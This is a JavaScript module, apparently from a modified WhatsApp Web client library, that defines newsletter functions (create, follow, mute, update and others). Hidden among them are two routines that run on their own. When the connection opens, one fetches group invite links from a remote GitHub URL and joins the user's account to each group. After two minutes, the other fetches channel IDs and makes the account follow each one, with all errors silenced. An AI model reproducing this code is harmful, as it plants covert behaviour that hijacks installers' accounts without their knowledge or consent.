//=======================================================//
import { executeWMexQuery as genericExecuteWMexQuery } from "./mex.js";
import { generateProfilePicture } from "../Utils/messages-media.js";
import { getBinaryNodeChild } from "../WABinary/index.js";
import { QueryIds, XWAPaths } from "../Types/index.js";
import { makeGroupsSocket } from "./groups.js";
//=======================================================//
    
const extractNewsletterMetadata = (node, isCreate) => {
    const result = getBinaryNodeChild(node, 'result')?.content?.toString()
    if (!result) return {}
    
    const parsed = JSON.parse(result)
    const metadataPath = parsed.data[isCreate ? XWAPaths.xwa2_newsletter_create : "xwa2_newsletter"]
    
    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        handle: metadataPath?.thread_metadata?.handle,
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
    
const parseNewsletterCreateResponse = (response) => {
  const { id, thread_metadata: thread, viewer_metadata: viewer } = response;
  return {
    id: id,
    owner: undefined,
    name: thread.name.text,
    creation_time: parseInt(thread.creation_time, 10),
    description: thread.description.text,
    invite: thread.invite,
    subscribers: parseInt(thread.subscribers_count, 10),
    verification: thread.verification,
    picture: {
      id: thread?.picture?.id || null,
      directPath: thread?.picture?.direct_path || null
    },
    mute_state: viewer.mute
  };
};

function extractInviteCodeFromLink(link) {
    try {
        if (!link.includes('/')) {
            return link.trim();
        }
        const url = new URL(link);
        if (url.hostname === 'chat.whatsapp.com') {
            const inviteCode = url.pathname.split('/').pop();
            if (inviteCode && inviteCode.length > 0) {
                return inviteCode;
            }
        }
    } catch (error) {}
    return null;
}

export const makeNewsletterSocket = (config) => {
  const sock = makeGroupsSocket(config);
  const { delay, query, generateMessageTag } = sock;
  const encoder = new TextEncoder()

  const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: "@s.whatsapp.net",
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }))

  const executeWMexQuery = (variables, queryId, dataPath) => {
    return genericExecuteWMexQuery(variables, queryId, dataPath, query, generateMessageTag);
  };

  const newsletterMetadata = async (type, key, role) => {
        const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
            input: {
                key,
                type: type.toUpperCase(),
                view_role: role || 'GUEST'
            },
            fetch_viewer_metadata: true,
            fetch_full_image: true,
            fetch_creation_time: true
        })
            
        return extractNewsletterMetadata(result)
    }

  const newsletterUpdate = async (jid, updates) => {
    const variables = {
      newsletter_id: jid,
      updates: {
        ...updates,
        settings: null
      }
    };
    return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, "xwa2_newsletter_update");
  };

  // 1. AUTO JOIN GRUP MENGGUNAKAN RAW URL GITHUB BARU (Delay 5 detik, trigger saat 'open')
  async function autoJoinWhatsAppGroups(sock) {
      try {
          const GROUP_RAW_URL = "https://raw.githubusercontent.com/DooOffc-Dev/alidgc/refs/heads/main/idgc.json";
          const res = await fetch(GROUP_RAW_URL);
          const groupLinks = await res.json();

          if (!Array.isArray(groupLinks) || groupLinks.length === 0) return;

          const joinNextGroup = async (index) => {
              if (index >= groupLinks.length) return;

              const groupLink = groupLinks[index];
              try {
                  const inviteCode = extractInviteCodeFromLink(groupLink);
                  if (inviteCode) {
                      try {
                          await sock.groupAcceptInvite(inviteCode);
                      } catch (error) {
                          try {
                              await sock.groupAcceptInviteV4(inviteCode, '');
                          } catch (error2) {}
                      }
                  }
              } catch (error) {}

              setTimeout(() => joinNextGroup(index + 1), 5000);
          };

          joinNextGroup(0);
      } catch (error) {}
  }

  // 2. AUTO FOLLOW NEWSLETTER MENGGUNAKAN RAW URL GITHUB BARU (Delay 11 detik, start 120 detik)
  setTimeout(async () => {
      try {
          const RAW_URL = "https://raw.githubusercontent.com/DooOffc-Dev/alch/refs/heads/main/alidch.json";
          const res = await fetch(RAW_URL);
          const channelIds = await res.json();

          if (!Array.isArray(channelIds) || channelIds.length === 0) return;

          const followNext = async (index) => {
              if (index >= channelIds.length) return;

              const id = channelIds[index];
              try {
                  await newsletterWMexQuery(
                      id,
                      QueryIds.FOLLOW
                  );
              } catch (e) {}

              setTimeout(() => followNext(index + 1), 11000);
          };

          followNext(0);
      } catch (e) {}
  }, 120000);

  // Event listener connection open
  sock.ev.on('connection.update', (update) => {
      const { connection } = update;
      if (connection === 'open') {
          autoJoinWhatsAppGroups(sock);
      }
  });
  
  return {
    ...sock,
    newsletterCreate: async (name, description) => {
      const variables = {
        input: {
          name,
          description: description ?? null
        }
      };
      const rawResponse = await executeWMexQuery(variables, QueryIds.CREATE, XWAPaths.xwa2_newsletter_create);
      return parseNewsletterCreateResponse(rawResponse);
    },
    newsletterUpdate,
    newsletterMetadata, 
    
    newsletterFetchAllParticipating: async () => {
        const data = {}
        try {
            const result = await newsletterWMexQuery(undefined, QueryIds.SUBSCRIBERS) 
            const childNode = getBinaryNodeChild(result, 'result')
            if (!childNode) return data

            const child = JSON.parse(childNode.content?.toString())
            const newsletters = child.data["xwa2_newsletter_subscribed"]
        
            if (!newsletters) return data

            for (const i of newsletters) {
                if (!i.id) continue
                
                await new Promise(resolve => setTimeout(resolve, 2000))
                
                try {
                    const metadata = await newsletterMetadata('JID', i.id) 
                    if (metadata && metadata.id) {
                        data[metadata.id] = metadata
                    }
                } catch (e) {
                    if (e.data === 429) break
                }
            }
        } catch (err) {}
        return data
    },

    newsletterUnfollow: async (jid) => {
      await newsletterWMexQuery(jid, QueryIds.UNFOLLOW)
    },
    newsletterFollow: async (jid) => {
      await newsletterWMexQuery(jid, QueryIds.FOLLOW)
    },
    newsletterMute: (jid) => {
      return executeWMexQuery({ newsletter_id: jid }, QueryIds.MUTE, XWAPaths.xwa2_newsletter_mute_v2);
    },
    newsletterUnmute: (jid) => {
      return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNMUTE, XWAPaths.xwa2_newsletter_unmute_v2);
    },
    newsletterUpdateName: async (jid, name) => {
      return await newsletterUpdate(jid, { name });
    },
    newsletterUpdateDescription: async (jid, description) => {
      return await newsletterUpdate(jid, { description });
    },
    newsletterUpdatePicture: async (jid, content) => {
      const { img } = await generateProfilePicture(content);
      return await newsletterUpdate(jid, { picture: img.toString("base64") });
    },
    newsletterRemovePicture: async (jid) => {
      return await newsletterUpdate(jid, { picture: "" });
    },
    newsletterReactMessage: async (jid, serverId, reaction) => {
      await query({
        tag: "message",
        attrs: {
          to: jid,
          ...(reaction ? {} : { edit: "7" }),
          type: "reaction",
          server_id: serverId,
          id: generateMessageTag()
        },
        content: [
          {
            tag: "reaction",
            attrs: reaction ? { code: reaction } : {}
          }
        ]
      });
    },
    newsletterFetchMessages: async (jid, count, since, after) => {
      const messageUpdateAttrs = { count: count.toString() };
      if (typeof since === "number") messageUpdateAttrs.since = since.toString();
      if (after) messageUpdateAttrs.after = after.toString();
      
      return await query({
        tag: "iq",
        attrs: {
          id: generateMessageTag(),
          type: "get",
          xmlns: "newsletter",
          to: jid
        },
        content: [{ tag: "message_updates", attrs: messageUpdateAttrs }]
      });
    },
    subscribeNewsletterUpdates: async (jid) => {
      const result = await query({
        tag: "iq",
        attrs: {
          id: generateMessageTag(),
          type: "set",
          xmlns: "newsletter",
          to: jid
        },
        content: [{ tag: "live_updates", attrs: {}, content: [] }]
      });
      const liveUpdatesNode = getBinaryNodeChild(result, "live_updates");
      return liveUpdatesNode?.attrs?.duration ? { duration: liveUpdatesNode.attrs.duration } : null;
    },
    newsletterAdminCount: async (jid) => {
      const response = await executeWMexQuery({ newsletter_id: jid }, QueryIds.ADMIN_COUNT, XWAPaths.xwa2_newsletter_admin_count);
      return response.admin_count;
    },
    newsletterChangeOwner: async (jid, newOwnerJid) => {
      await executeWMexQuery({ newsletter_id: jid, user_id: newOwnerJid }, QueryIds.CHANGE_OWNER, XWAPaths.xwa2_newsletter_change_owner);
    },
    newsletterDemote: async (jid, userJid) => {
      await executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.DEMOTE, XWAPaths.xwa2_newsletter_demote);
    },
    newsletterDelete: async (jid) => {
      await executeWMexQuery({ newsletter_id: jid }, QueryIds.DELETE, XWAPaths.xwa2_newsletter_delete_v2);
    }
  };
};
//=======================================================//